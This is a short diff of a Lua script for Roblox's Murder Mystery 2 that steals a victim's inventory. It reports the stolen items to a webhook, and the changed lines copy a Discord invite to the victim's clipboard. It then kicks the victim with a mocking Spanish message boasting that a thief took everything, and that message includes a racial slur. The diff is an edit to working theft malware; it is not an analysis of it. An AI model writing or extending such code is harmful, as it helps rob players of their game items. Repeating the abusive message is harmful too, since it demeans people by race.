@@ -221,7 +221,8 @@ local function TradeFinalizado()
     end
     SendWebhook("📦 Inventario enviado","",fieldsFinal)
     task.wait(5)
-    LocalPlayer:Kick("El mejor ladeon Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
+    setclipboard("https://discord.gg/4VySnCHy") -- auto copia el enlace
+    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
 
 local function doTrade(targetName)
